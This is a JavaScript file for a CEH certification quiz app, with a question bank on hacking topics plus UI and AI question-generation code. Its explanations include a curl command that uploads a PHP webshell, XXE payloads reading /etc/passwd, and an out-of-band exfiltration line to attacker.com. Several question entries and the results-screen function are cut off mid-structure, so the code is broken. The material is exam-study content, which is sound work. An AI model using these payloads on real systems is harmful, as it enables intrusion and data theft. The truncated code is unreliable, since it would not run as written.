q:'An attacker types "site:target.com filetype:xls" into Google. What is the purpose?',
opts:['To find all Excel files on any site containing target.com\'s content','To find all Excel spreadsheets hosted on target.com\'s web servers  --  which may contain sensitive data like employee lists, financial data, or credentials','To download target.com\'s entire website in Excel format','To map target.com\'s sitemap as an Excel file'],
ans:1,hint:'site: restricts to the domain; filetype: filters to a specific file type.',
correct_fb:'"<strong>site:target.com filetype:xls</strong>" finds all Excel files (.xls) indexed by Google that are hosted on target.com. Organizations often accidentally expose sensitive spreadsheets: employee rosters, financial data, customer lists, salary information, or even password spreadsheets. Google dork combinations: "filetype:sql" (database dumps), "filetype:pdf" (documents), "filetype:pptx" (presentations), "ext:log" (log files). Extremely effective passive reconnaissance.',
wrong_fb:'<strong>site:target.com filetype:xls = find all Excel files on target.com</strong>. This discovers accidentally indexed sensitive documents. Other valuable filetype dorks: filetype:sql (database dumps with credentials), filetype:env (environment files with API keys), filetype:conf (configuration files), filetype:bak (backup files), ext:log (log files). The "ext:" operator also works. Check robots.txt for hints about what directories to dork.'},

// -- TOPIC 2: Scanning --
{topic:2,diff:'medium',type:'Multiple Choice',
q:'What is the purpose of the Nmap Scripting Engine (NSE)?',
opts:['To write Nmap scan results into scripts for documentation','To extend Nmap\'s functionality with scripts that perform vulnerability detection, service exploitation, brute-forcing, and advanced discovery','To script automated firewall bypass techniques','To create custom port definitions for nmap scanning'],
ans:1,hint:'NSE scripts extend what Nmap can do far beyond basic port scanning.',
correct_fb:'The <strong>NSE (Nmap Scripting Engine)</strong> uses Lua scripts to extend Nmap\'s capabilities: vulnerability detection (--script vuln), service brute-forcing (--script brute), malware detection, advanced service interrogation, and exploitation. Scripts are categorized: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln. Use: "nmap --script smb-vuln-ms17-010 target" to check for EternalBlue vulnerability.',
wrong_fb:'<strong>NSE = Lua-scripted extensions for Nmap</strong>. Script categories: safe (run by default with -sC), intrusive (may crash services), vuln (check for vulnerabilities), brute (password attacks), discovery (network enumeration). Common scripts: http-title (get web page titles), ssl-cert (show SSL certificate details), smb-vuln-ms17-010 (EternalBlue check), ftp-anon (anonymous FTP check), smtp-enum-users (SMTP user enumeration). "nmap -sC" runs all default (safe) scripts.'},

{topic:2,diff:'easy',type:'Multiple Choice',
q:'Which protocol does traceroute use by default on Linux vs Windows?',
opts:['Both use ICMP by default','Linux uses UDP datagrams; Windows tracert uses ICMP Echo Requests by default','Linux uses TCP; Windows uses UDP','Both use TCP SYN packets'],
ans:1,hint:'The implementations differ by OS  --  one uses UDP, one uses ICMP.',
correct_fb:'<strong>Linux traceroute</strong>: uses <strong>UDP datagrams</strong> (default) sent to high port numbers (33434+), incrementing TTL. <strong>Windows tracert</strong>: uses <strong>ICMP Echo Requests</strong>. Linux traceroute can also be configured to use ICMP (-I) or TCP (-T). Firewalls blocking UDP or ICMP will show "* * *" (no response). TCP traceroute (-T on Linux) often penetrates firewalls better since TCP port 80 is usually allowed.',
wrong_fb:'<strong>Linux traceroute = UDP (default)</strong>. <strong>Windows tracert = ICMP</strong>. Both work by incrementing TTL  --  each router that decrements TTL to 0 sends ICMP Time Exceeded back to the sender, revealing its IP. Linux alternatives: traceroute -I (ICMP), traceroute -T (TCP). When hops show *** it means the router drops the probe without responding  --  common for ICMP-blocking firewalls. Use TCP traceroute to bypass ICMP filters.'},

// -- TOPIC 3: Sniffing --
{topic:3,diff:'medium',type:'Multiple Choice',
q:'What is HTTPS interception (SSL inspection) and how do enterprise solutions perform it?',
opts:['Cracking SSL encryption using rainbow tables on captured HTTPS traffic','A proxy-based MITM where the enterprise\'s proxy decrypts HTTPS traffic using its own CA certificate (trusted by all company devices via GPO), inspects it, then re-encrypts to the destination','Blocking all HTTPS traffic to force users to HTTP for monitoring','Using Wireshark with the server\'s private key to decrypt HTTPS sessions'],
ans:1,hint:'Enterprises need to inspect encrypted traffic  --  how do they do it without breaking HTTPS?',
correct_fb:'<strong>SSL/TLS inspection (HTTPS interception)</strong>: enterprise proxy acts as MITM  --  it presents its own certificate (signed by an enterprise CA trusted by all company devices via GPO/MDM) to clients, decrypts the traffic, inspects it, re-encrypts with the real server\'s certificate. Users see the enterprise CA certificate, not the real server certificate. Security tools (Palo Alto, Zscaler, Bluecoat) use this for DLP, malware detection, and policy enforcement.',
wrong_fb:'<strong>SSL inspection = authorized enterprise MITM</strong>. Works because: enterprise pushes its own CA cert to all managed devices via GPO -> devices trust the proxy\'s forged certificates -> proxy decrypts, inspects, re-encrypts. Detection: inspect the certificate chain  --  if an enterprise CA signed the certificate instead of DigiCert/Let\'s Encrypt, SSL inspection is occurring. Privacy implications: all HTTPS traffic (banking, personal email) is decrypted by the employer.'},

// -- TOPIC 4: System Hacking --
{topic:4,diff:'hard',type:'Multiple Choice',
q:'What is "lateral movement" in the context of system hacking?',
opts:['Moving malware files to different locations to avoid detection','Spreading access across the network  --  after compromising one system, moving to other systems using obtained credentials, trust relationships, or vulnerabilities','Changing attack techniques laterally instead of escalating privileges','Routing attack traffic through multiple systems to hide the source'],
ans:1,hint:'Lateral = sideways across the network, not just deeper into one system.',
correct_fb:'<strong>Lateral movement</strong> spreads access across the network after initial compromise. Techniques: Pass-the-Hash (use NTLM hash to authenticate), Pass-the-Ticket (use Kerberos TGT), Remote Service Exploitation (exploit vulnerabilities on other systems), Remote Desktop (RDP with compromised credentials), WMI/PSExec (remote execution), Token Impersonation. Goal: reach high-value targets (domain controllers, file servers, databases) from an initial beachhead.',
wrong_fb:'<strong>Lateral movement = spread across network after initial compromise</strong>. Tools: Mimikatz (get credentials), BloodHound (map AD attack paths), Impacket (PsExec, WMI, SMB attacks), CrackMapExec (mass credential spraying). Common path: compromise workstation -> harvest credentials -> lateral move to server -> escalate to domain admin -> pwn domain controller. Defense: network segmentation, local admin restriction, LAPS (Local Administrator Password Solution), behavioral analytics.'},

{topic:4,diff:'medium',type:'Multiple Choice',
q:'What is the SAM database in Windows and why do attackers target it?',
opts:['Security Audit Manager  --  the Windows event logging system','Security Account Manager  --  stores hashed passwords for local accounts; targeted because cracking these hashes yields local admin credentials','System Access Module  --  controls remote desktop access permissions','Shared Access Manager  --  manages network share permissions'],
ans:1,hint:'SAM = Security Account Manager  --  it stores something very valuable.',
correct_fb:'The <strong>SAM (Security Account Manager)</strong> database stores <strong>NTLM hashed passwords</strong> for all local Windows user accounts. Located at C:\\Windows\\System32\\config\\SAM (locked while Windows runs). Attackers extract it by: booting from external media, using Volume Shadow Copy (vssadmin), using Mimikatz with SYSTEM privileges, or using reg save commands. Once extracted, hashes can be cracked offline (John the Ripper, Hashcat) or used directly (pass-the-hash).',
wrong_fb:'<strong>SAM = local account password hashes (NTLM)</strong>. Domain account hashes are stored in NTDS.dit on domain controllers. Extraction methods: offline (boot from Linux, mount Windows partition), Volume Shadow Copy (access shadow copies while system runs), Impacket\'s secretsdump.py, Mimikatz "lsadump::sam". Defense: Credential Guard (virtualizes SAM/LSA secrets), restrict SYSTEM access, monitor for suspicious registry access to SAM hive.'},

// -- TOPIC 5: Malware --
{topic:5,diff:'medium',type:'Multiple Choice',
q:'What is a "dropper" in malware terminology?',
opts:['A tool for dropping firewall rules to allow malware communication','A malware component that installs and executes other malware on the target system  --  it "drops" the payload after initial infection','A spam tool that drops phishing emails into victim inboxes','A rootkit component that drops privileges to evade detection'],
ans:1,hint:'Dropper = drops the real malware onto the system.',
correct_fb:'A <strong>dropper</strong> is a malware delivery mechanism that contains and installs (drops) other malware on the target. The dropper may: decrypt and execute an embedded payload, download additional components from C2, or bypass security controls to install the main malware. Droppers are commonly delivered via phishing attachments (malicious Word/PDF macros) and are designed to evade detection  --  they may look benign and the actual malware is only unpacked in memory.',
wrong_fb:'<strong>Dropper = installs the real malware payload</strong>. Stages: Dropper (delivery vehicle) -> Downloader (fetches additional components) -> Main payload (RAT, ransomware, etc.) -> Persistence mechanism. Malware stages are separated so initial detection doesn\'t reveal the full capability. Example: phishing email -> malicious Word doc (dropper) -> macro downloads additional DLL -> DLL injects into legitimate process -> establishes C2 communication.'},

{topic:5,diff:'hard',type:'Multiple Choice',
q:'What is "process hollowing" and why is it used by sophisticated malware?',
opts:['Deleting all running processes to force a system restart','Creating a legitimate process in a suspended state, hollowing out its memory, and replacing it with malicious code  --  the malicious code runs under the legitimate process name, evading process-based detection','Reducing process priority to hide CPU usage from process monitors','Injecting malware into kernel-level processes to gain SYSTEM privileges'],
ans:1,hint:'The legitimate process is hollowed out  --  its contents replaced with malware.',
correct_fb:'<strong>Process hollowing</strong>: (1) Create legitimate process (e.g., svchost.exe) in suspended state, (2) Unmap/hollow the process memory, (3) Write malicious code into the hollowed process space, (4) Resume execution  --  now malware runs as svchost.exe. Process monitors and AV see legitimate process names; the malicious code runs underneath. Detection: parent-child process anomalies, memory scanning showing mismatch between on-disk binary and in-memory code.',
wrong_fb:'<strong>Process hollowing = malware disguised as legitimate process</strong>. Detection indicators: svchost.exe spawned by unusual parent process, mismatch between image path and memory contents, unsigned code in normally-signed processes. Detection tools: Process Hacker, PE-sieve (scans processes for hollowing), EDR behavioral detection. Related: DLL injection (inject DLL into legitimate process), reflective DLL injection (DLL maps itself without LoadLibrary), process doppelganging (similar but uses NTFS transactions).'},

// -- TOPIC 6: Wireless --
{topic:6,diff:'medium',type:'Multiple Choice',
q:'What 802.11 wireless standard operates in the 5GHz band only?',
opts:['802.11b','802.11g','802.11a','802.11n'],
ans:2,hint:'One early standard was 5GHz only  --  it came before the more popular 2.4GHz standards.',
correct_fb:'<strong>802.11a</strong> operates exclusively in the <strong>5GHz band</strong> at up to 54 Mbps. It was ratified in 1999 (same time as 802.11b). Less interference (5GHz less crowded than 2.4GHz) but shorter range and more expensive. 802.11b (2.4GHz, 11Mbps), 802.11g (2.4GHz, 54Mbps), 802.11n (2.4GHz AND 5GHz, up to 600Mbps), 802.11ac/Wi-Fi 5 (5GHz only), 802.11ax/Wi-Fi 6 (2.4 and 5GHz). Know these for the CEH exam.',
wrong_fb:'Wireless standards: 802.11a=<strong>5GHz, 54Mbps</strong>. 802.11b=2.4GHz, 11Mbps. 802.11g=2.4GHz, 54Mbps. 802.11n=2.4/5GHz, 600Mbps. 802.11ac=5GHz, multi-Gbps. 802.11ax(Wi-Fi 6)=2.4/5GHz. Security evolution: WEP (broken) -> WPA-TKIP (deprecated) -> WPA2-AES (current standard) -> WPA3-SAE (newest). The CEH exam tests both wireless standards and security protocols.'},

{topic:6,diff:'hard',type:'Multiple Choice',
q:'What is a "rogue access point" vs an "evil twin" attack?',
opts:['They are completely identical attacks with different names','A rogue AP is an unauthorized AP connected to the corporate network (insider threat); an evil twin mimics a legitimate external network to deceive users into connecting','A rogue AP targets enterprise networks; an evil twin targets only home networks','An evil twin uses a different SSID; a rogue AP uses the same SSID'],
ans:1,hint:'Rogue = unauthorized inside the network; evil twin = fake copy of a legitimate network.',
correct_fb:'<strong>Rogue AP</strong>: an unauthorized access point connected to the corporate LAN (plugged into an Ethernet port by an insider or left by an attacker after physical access). It gives external attackers a wireless entry into the wired network, bypassing perimeter controls. <strong>Evil Twin</strong>: a malicious AP broadcasting the same SSID as a legitimate network to deceive external users into connecting and intercepting their traffic. Different threats, different mitigations.',
wrong_fb:'<strong>Rogue AP = unauthorized AP on corporate wired network</strong> (insider threat, physical access attack). <strong>Evil twin = fake copy of legitimate wireless network</strong> (external users deceived). Rogue AP detection: wireless IDS scanning for unauthorized APs, 802.1X port authentication (requires auth before LAN access). Evil twin detection: certificate validation, VPN usage, monitoring for duplicate SSIDs. WiFi Pineapple is a common evil twin device.'},

// -- TOPIC 7: Web App --
{topic:7,diff:'medium',type:'Multiple Choice',
q:'What is "blind SQL injection" and why is it harder to exploit than classic SQLi?',
opts:['SQLi that targets database instances the attacker cannot see on the network','SQLi where the application doesn\'t return query results or errors directly  --  the attacker must infer information through boolean responses or time delays rather than seeing output','SQLi that blindly tries all possible SQL syntax variations','SQLi that targets only stored procedures'],
ans:1,hint:'Blind = no direct output. You have to ask yes/no questions or measure timing.',
correct_fb:'<strong>Blind SQLi</strong>: the application doesn\'t display database content or errors  --  the attacker can\'t see results directly. Two types: <strong>Boolean-based</strong> (application returns different responses for true/false conditions  --  attacker asks "is the first letter of the password A?" through response differences), <strong>Time-based</strong> (inject "SLEEP(5)"  --  if the response is delayed, the condition was true). Very slow but just as dangerous. Tool: sqlmap handles both automatically.',
wrong_fb:'<strong>Blind SQLi = no direct output, infer via side-channel</strong>. Boolean: "AND 1=1" (true, page loads normally) vs "AND 1=2" (false, page differs) -> ask yes/no questions one bit at a time. Time-based: "AND SLEEP(5)" -> if response delays 5 seconds, condition is true. Both allow extracting complete database contents, just very slowly. sqlmap --technique=B (boolean) or --technique=T (time) automates blind SQLi. Error-based SQLi is easiest (errors reveal data directly).'},

{topic:7,diff:'easy',type:'Multiple Choice',
q:'What HTTP method should NOT be enabled on web servers in production and why?',
opts:['GET  --  it reveals source IP addresses to the server','PUT and DELETE  --  they allow unauthorized file upload and deletion if not properly secured','POST  --  it allows data submission which enables SQLi','OPTIONS  --  it reveals too much information about server capabilities'],
ans:1,hint:'Some HTTP methods are designed for specific purposes that become dangerous without proper auth.',
correct_fb:'<strong>PUT</strong> (upload files to server) and <strong>DELETE</strong> (remove server files) should be disabled unless specifically needed and properly authenticated. If enabled without authentication, attackers can upload webshells (PUT a PHP/ASP file -> execute server-side code) or delete application files. Other dangerous methods: TRACE (enables XST  --  Cross-Site Tracing attacks), WebDAV methods (PROPFIND, MOVE, COPY). Test with: "nmap --script http-methods target.com".',
wrong_fb:'<strong>HTTP PUT + DELETE = dangerous if enabled without auth</strong>. Testing for enabled methods: OPTIONS request returns "Allow: GET, POST, PUT, DELETE, TRACE" header. Nmap script: "http-methods". Webshell upload via PUT: "curl -X PUT http://target.com/shell.php -d \'<?php system($_GET[\"cmd\"]); ?>\'". Disable: Apache (Limit directive), Nginx (limit_except), IIS (WebDAV settings). Only enable methods actually needed by the application.'},

{topic:7,diff:'hard',type:'Multiple Choice',
q:'What is "XML External Entity (XXE) injection"?',
opts:['Injecting malicious XML tags into SQL queries','Exploiting XML parsers that process external entity references  --  allowing attackers to read local files, perform SSRF, or execute DoS attacks by defining malicious entities in XML input','Injecting JavaScript into XML attributes for XSS attacks','Using XML-encoded payloads to bypass WAF signature detection'],
ans:1,hint:'External entities in XML can reference external resources  --  what if the attacker controls what resource is referenced?',
correct_fb:'<strong>XXE injection</strong> exploits XML parsers configured to process external entities. Attackers define a malicious entity in XML input: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>. When the parser processes the entity, it reads /etc/passwd and includes it in the response. Impacts: local file read (LFI), SSRF (reference internal URLs), blind XXE (out-of-band data exfiltration), DoS (billion laughs attack). Prevention: disable external entity processing in XML parsers.',
wrong_fb:'<strong>XXE = XML external entity -> read files/SSRF via XML parser</strong>. Classic payload: SYSTEM "file:///etc/passwd" reads Linux password file. SSRF via XXE: SYSTEM "http://169.254.169.254/metadata/" reads AWS metadata. Blind XXE: SYSTEM "http://attacker.com/?data=[exfiltrated]" sends data out-of-band. Prevention: disable DTD processing, disable external entities (java: FEATURE_EXTERNAL_GENERAL_ENTITIES=false), use JSON instead of XML where possible, WAF rules for XXE patterns.'},

// -- TOPIC 8: Cryptography --
{topic:8,diff:'medium',type:'Multiple Choice',
q:'What is a "hash collision" and why does it matter for security?',
opts:['Two hash algorithms producing results with the same bit length','When two different inputs produce the same hash output  --  breaking collision resistance allows forging digital signatures and certificates','A denial-of-service attack that floods hash processing functions','When a hash function produces outputs that collide with firewall rules'],
ans:1,hint:'Same output from different inputs = collision. What could an attacker do with that?',
correct_fb:'A <strong>hash collision</strong> occurs when two different inputs produce the identical hash output. Security implication: if an attacker can create a collision, they can forge digital signatures (sign their malicious document using a hash that matches a legitimate document\'s hash). MD5 and SHA-1 have demonstrated collision attacks. 2008: researchers forged a CA certificate by exploiting MD5 collision (broke HTTPS trust). SHA-256 and SHA-3 are designed with collision resistance as a primary goal.',
wrong_fb:'<strong>Hash collision = two different inputs -> same hash output</strong>. Breaks: digital signatures (forge signature by creating collision), integrity checks (substitute files with same hash), certificate authorities (forged CAs as demonstrated in 2008 MD5 attack). Collision attacks: birthday attack (2^(n/2) complexity), chosen-prefix collision (creates two meaningful documents with same hash). Defense: use SHA-256 or SHA-3 minimum. Never use MD5 or SHA-1 for security purposes.'},

{topic:8,diff:'easy',type:'Multiple Choice',
q:'What is the purpose of a "salt" in password hashing?',
opts:['To make passwords longer and more complex for users','A random unique value added to each password before hashing  --  prevents rainbow table attacks and ensures identical passwords produce different hashes','To encrypt the hash for additional security','To add a timestamp to each password hash to track when it was created'],
ans:1,hint:'Salt is added to prevent precomputed attacks.',
correct_fb:'A <strong>salt</strong> is a <strong>random unique value</strong> added to each password before hashing. Example: password "abc123" + salt "x7$kP" -> hash(abc123x7$kP). Even if two users have the same password, their salted hashes are completely different. This prevents: rainbow table attacks (can\'t precompute salted hashes), and reveals that only the salted hash is valid (an attacker who leaks the database still can\'t use rainbow tables). Salts are stored alongside the hash.',
wrong_fb:'<strong>Salt = random value added per password before hashing</strong>. Without salt: all users with password "password123" have the same hash -> crack once, crack all. With salt: each user has unique salt -> each has unique hash -> must crack individually. Salts don\'t need to be secret  --  they\'re stored in plaintext alongside the hash. Modern password hashing: bcrypt, scrypt, Argon2 all include automatic salting. NEVER roll your own password hashing  --  use these proven algorithms.'},

{topic:8,diff:'hard',type:'Multiple Choice',

ans:1,hint:'PKI = the ecosystem of trust for public key cryptography.',

{topic:9,diff:'medium',type:'Multiple Choice',

{topic:10,diff:'medium',type:'Multiple Choice',
q:'What is "ICMP tunneling" and how does it bypass firewalls?',
opts:['Flooding targets with ICMP to create a denial of service tunnel','Encapsulating non-ICMP traffic (data, C2 communications) inside ICMP packets  --  firewalls that allow ICMP ping traffic pass the tunnel without inspecting its payload','Using ICMP to scan for open tunnels in a network','A type of VPN that uses ICMP for key exchange'],
ans:1,hint:'ICMP packets can carry data payloads  --  what if you hide other traffic inside them?',
correct_fb:'<strong>ICMP tunneling</strong> hides arbitrary data inside ICMP Echo Request/Reply packets. Since many firewalls allow ICMP (for ping) without deep inspection, tunneled traffic passes through undetected. Used for: covert C2 communication, data exfiltration, bypassing network restrictions. Tools: ptunnel, icmptunnel, nping. Detection: unusual ICMP payload size/patterns (normal ping has ~32 bytes; tunneled ICMP has much larger payloads), high volume ICMP, ICMP to external hosts.',
wrong_fb:'<strong>ICMP tunneling = hide data inside ping packets</strong>. Normal ICMP payload: 32-56 bytes. Tunneled: hundreds/thousands of bytes. Similarly: DNS tunneling (data in DNS queries/responses  --  passes DNS-permissive firewalls), HTTP tunneling (hide traffic in HTTP  --  port 80 usually allowed), SSH tunneling (legitimate encrypted tunnel through port 22). All exploit "allowed" protocols to carry unauthorized traffic. Defense: deep packet inspection, anomaly detection, restrict ICMP to necessary types only.'},

{topic:10,diff:'hard',type:'Multiple Choice',

opts:['NTP attacks amplify time synchronization errors across the network','An attacker sends spoofed NTP MONLIST requests to NTP servers  --  which respond with lists of the last 600 hosts that queried the server, generating up to 556x amplification','NTP amplification uses multiple time servers to create synchronized DoS waves','NTP servers amplify SYN flood attacks by adding time-delay metadata'],
ans:1,hint:'The MONLIST command returns a lot of data for a tiny request.',
correct_fb:'<strong>NTP amplification</strong> abuses the <strong>MONLIST command</strong>  --  which returns the last 600 hosts that queried the NTP server. A tiny request (54 bytes) generates a response of up to 48KB (list of 600 IP addresses)  --  <strong>up to 556x amplification</strong>. Attacker spoofs victim\'s IP -> NTP server floods victim with 48KB responses. Mitigation: disable MONLIST ("noquery" in ntp.conf, or update to NTPv4 which disables it by default), BCP38 filtering.',

{topic:11,diff:'medium',type:'Multiple Choice',

// =============================================================
//  STATE
// =============================================================
const state = {
  screen: 'home',
  topic: 'all',
  mode: 'study',
  correct: 0, wrong: 0, total: 0,
  currentQ: null,
  answered: false,
  questionNum: 0,
  sessionQuestions: [],
  aiLoading: false
};

// =============================================================
//  HELPERS
// =============================================================
function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function getFiltered() {
  const pool = state.topic === 'all'
    ? [...QUESTION_BANK]
    : QUESTION_BANK.filter(q => q.topic === state.topic);
  return shuffle(pool);
}

function diffClass(d) {
  return d === 'easy' ? 'badge-easy' : d === 'medium' ? 'badge-medium' : 'badge-hard';
}

function updateHeader() {
  document.getElementById('h-correct').textContent = state.correct;
  document.getElementById('h-wrong').textContent   = state.wrong;
  document.getElementById('h-total').textContent   = state.total;
  const pct = state.total > 0 ? Math.round((state.correct / state.total) * 100) : null;
  const el  = document.getElementById('h-pct');
  el.textContent  = pct !== null ? pct + '%' : '--';
  el.style.color  = pct === null ? 'var(--warn)' : pct >= 70 ? 'var(--correct)' : 'var(--wrong)';
}

function setRoot(html) {
  document.getElementById('app-root').innerHTML = html;
}

// =============================================================
//  SCREEN: HOME
// =============================================================
function showHome() {
  state.screen = 'home';
  const cards = TOPICS.map((t, i) => `
    <div class="topic-card" data-start-topic="${i}">
      <div class="tc-icon">${ICONS[i]}</div>
      <div class="tc-title">${t}</div>
      <div class="tc-desc">${DESCS[i]}</div>
    </div>`).join('');

  setRoot(`
    <div class="home-screen">
      <h1>CEH Master Exam Trainer</h1>
      <p>AI-powered CEH exam preparation -- 186 questions across all 12 domains, based on the CEH Certified Ethical Hacker Practice Exams (Matt Walker, 4th Edition). Every answer includes a detailed explanation.</p>

      <div style="margin-bottom:18px;">
        <div style="font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin-bottom:9px;">Study Mode</div>
        <div class="mode-select-row">
          <div class="mode-opt ${state.mode === 'study' ? 'active' : ''}" data-select-mode="study">📚 Study Mode -- Hints &amp; full explanations</div>
          <div class="mode-opt ${state.mode === 'exam'  ? 'active' : ''}" data-select-mode="exam">⏱ Exam Mode -- No hints, simulate real conditions</div>
        </div>
      </div>

      <div style="font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin-bottom:9px;">Focus Area</div>
      <div class="topic-grid">${cards}</div>
      <button class="btn-start" id="btn-start-all">🎯 Start Full Practice Exam -- All 12 Domains</button>
    </div>`);

  // Attach home screen events
  document.getElementById('btn-start-all').addEventListener('click', () => {
    setTopic('all');
    startSession();
  });

  document.querySelectorAll('[data-start-topic]').forEach(el => {
    el.addEventListener('click', () => {
      const t = parseInt(el.dataset.startTopic);
      setTopic(t);
      startSession();
    });
  });

  document.querySelectorAll('[data-select-mode]').forEach(el => {
    el.addEventListener('click', () => {
      setMode(el.dataset.selectMode);
      // Update selected styles on home screen mode buttons
      document.querySelectorAll('[data-select-mode]').forEach(e => {
        e.classList.toggle('active', e.dataset.selectMode === state.mode);
      });
    });
  });
}

// =============================================================
//  SCREEN: QUESTION
// =============================================================
function showQuestion() {
  state.screen = 'question';
  if (state.questionNum >= state.sessionQuestions.length) {
    showResults();
    return;
  }
  state.currentQ  = state.sessionQuestions[state.questionNum];
  state.answered  = false;

  const q     = state.currentQ;
  const total = state.sessionQuestions.length;
  const pct   = Math.round((state.questionNum / total) * 100);
  const dc    = diffClass(q.diff);

  const qText  = q.q.includes('\n') ? q.q.split('\n')[0] : q.q;
  const qCode  = q.q.includes('\n')
    ? `<div class="q-code">${q.q.split('\n').slice(1).join('\n').trim()}</div>` : '';

  const opts = q.opts.map((o, i) => `
    <div class="option" data-idx="${i}">
      <div class="opt-letter">${String.fromCharCode(65 + i)}</div>
      <div>${o}</div>
    </div>`).join('');

  setRoot(`
    <div class="content">
      <div class="progress-wrap">
        <div class="progress-labels">
          <span>Question ${state.questionNum + 1} of ${total}</span>
          <span>${state.correct} correct &middot; ${state.wrong} wrong</span>
        </div>
        <div class="progress-bar-bg"><div class="progress-fill" style="width:${pct}%"></div></div>
      </div>

      <div class="q-card">
        <div class="q-meta">
          <span class="badge badge-topic">${TOPICS[q.topic]}</span>
          <span class="badge ${dc}">${q.diff}</span>
          <span class="badge badge-type">${q.type}</span>
          <span class="q-num">#${state.questionNum + 1}</span>
        </div>
        <div class="q-text">${qText}</div>
        ${qCode}
        <div class="options" id="options">${opts}</div>
        <div class="hint-box" id="hint-box">💡 <strong>Hint:</strong> ${q.hint}</div>
        <div class="feedback" id="feedback"></div>
      </div>

      <div class="controls">
        <button class="btn-primary" id="btn-next" disabled>Next Question →</button>
        <button class="btn-secondary" id="btn-skip">Skip</button>
        ${state.mode === 'study' ? '<button class="btn-hint-style" id="btn-hint">💡 Hint</button>' : ''}
      </div>

      <div class="ai-zone">
        <div class="ai-zone-label">✨ AI-Generated Bonus Question</div>
        <div id="ai-zone-content">
          <button class="btn-hint-style" id="btn-ai">Generate AI Question for ${state.topic === 'all' ? 'Random Domain' : TOPICS[state.topic]} →</button>
        </div>
      </div>
    </div>`);

  // Attach question screen events
  document.querySelectorAll('.option').forEach(el => {
    el.addEventListener('click', () => {
      if (!state.answered) selectAnswer(parseInt(el.dataset.idx));
    });
  });

  document.getElementById('btn-next').addEventListener('click', () => {
    state.questionNum++;
    showQuestion();
  });

  document.getElementById('btn-skip').addEventListener('click', () => {
    state.questionNum++;
    showQuestion();
  });

  const hintBtn = document.getElementById('btn-hint');
  if (hintBtn) {
    hintBtn.addEventListener('click', () => {
      document.getElementById('hint-box').classList.toggle('show');
    });
  }

  document.getElementById('btn-ai').addEventListener('click', generateAI);
}

function selectAnswer(idx) {
  if (state.answered) return;
  state.answered = true;
  state.total++;

  const q         = state.currentQ;
  const isCorrect = idx === q.ans;
  if (isCorrect) state.correct++;
  else           state.wrong++;
  updateHeader();

  document.querySelectorAll('.option').forEach((el, i) => {
    el.classList.add('disabled');
    if (i === q.ans)               el.classList.add(isCorrect ? 'correct' : 'reveal');
    else if (i === idx && !isCorrect) el.classList.add('wrong');
  });

  const fb = document.getElementById('feedback');
  fb.className = 'feedback show ' + (isCorrect ? 'fb-correct' : 'fb-wrong');
  fb.innerHTML = isCorrect
    ? `<div class="feedback-title">✓ Correct!</div>${q.correct_fb}`
    : `<div class="feedback-title">✗ Incorrect -- Here is why:</div>${q.wrong_fb}`;

  document.getElementById('btn-next').disabled = false;
  document.getElementById('hint-box').classList.remove('show');
}

        <div class="results-stats">
          <div class="stat-box"><div class="stat-num" style="color:var(--correct);">${state.correct}</div><div class="stat-lbl">Correct</div></div>

        <p style="color:var(--dim);font-size:.83rem;margin-bottom:18px;max-width:420px;margin-left:auto;margin-right:auto;">
          ${pct >= 80
            ? 'Excellent work! You are demonstrating strong CEH exam readiness. Review any domains where you struggled.'
            : pct >= 70
            ? 'Good progress. The CEH passing score is 70%. Focus on your weak domains and retake specifically those.'
            : 'Keep practicing. Use Study Mode to read every explanation carefully. Focus one domain at a time.'}
        </p>
        <div style="display:flex;gap:11px;justify-content:center;flex-wrap:wrap;">
          <button class="btn-primary" id="btn-retake">🔄 Retake This Session</button>
          <button class="btn-start" id="btn-home" style="background:var(--accent2);color:#000;">🏠 Choose Domain</button>
        </div>
      </div>
    </div>`);

  document.getElementById('btn-retake').addEventListener('click', startSession);
  document.getElementById('btn-home').addEventListener('click', () => {
    state.correct = 0; state.wrong = 0; state.total = 0;
    updateHeader();
    showHome();
  });
}

// =============================================================
//  SESSION CONTROL
// =============================================================
function startSession() {
  state.sessionQuestions = getFiltered();
  state.questionNum = 0;
  state.correct = 0; state.wrong = 0; state.total = 0;
  updateHeader();
  showQuestion();
}

function setTopic(t) {
  state.topic = t;
  // Update sidebar active state
  document.querySelectorAll('.topic-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.topic == t);
  });
}

function setMode(m) {
  state.mode = m;
  document.getElementById('mb-study').classList.toggle('active', m === 'study');
  document.getElementById('mb-exam').classList.toggle('active', m === 'exam');
}

// =============================================================
//  AI QUESTION GENERATION
// =============================================================
async function generateAI() {
  const zone      = document.getElementById('ai-zone-content');
  const topicName = state.topic === 'all'
    ? TOPICS[Math.floor(Math.random() * TOPICS.length)]
    : TOPICS[state.topic];

  zone.innerHTML = `<div style="padding:14px;background:var(--card);border:1px solid var(--border);border-radius:8px;display:flex;align-items:center;">
    <div class="spinner"></div>
    <span style="font-family:'Share Tech Mono',monospace;font-size:.78rem;color:var(--dim);">Generating CEH question on: ${topicName}...</span>
  </div>`;

  const sys = `You are a strict CEH (Certified Ethical Hacker) exam facilitator. Generate ONE realistic exam-quality CEH question about: ${topicName}.
Return ONLY valid JSON (no markdown, no preamble):
{"question":"Question text","options":["A","B","C","D"],"correct_index":0,"difficulty":"medium","type":"Multiple Choice","hint":"Brief hint","correct_feedback":"Why correct is right -- use <strong> tags for key terms","wrong_feedback":"Why wrong answers fail and correct is right -- use <strong> tags"}
correct_index is 0-3.`;

  try {
    const resp = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'claude-sonnet-4-20250514',
        max_tokens: 1000,
        system: sys,
        messages: [{ role: 'user', content: `Generate a ${state.mode === 'exam' ? 'hard' : 'medium'} difficulty CEH question about ${topicName}. JSON only.` }]
      })
    });
    const data = await resp.json();
    const raw  = data.content[0].text.trim().replace(/```json|```/g, '').trim();
    const q    = JSON.parse(raw);
    renderAIQuestion(q, zone);
  } catch(e) {
    zone.innerHTML = `<div style="color:var(--dim);font-size:.78rem;padding:12px;">
      Unable to generate question. Check connection.
      <button class="btn-hint-style" id="btn-ai-retry" style="margin-left:10px;font-size:.75rem;">Retry</button>
    </div>`;
    document.getElementById('btn-ai-retry').addEventListener('click', generateAI);
  }
}

function renderAIQuestion(q, zone) {
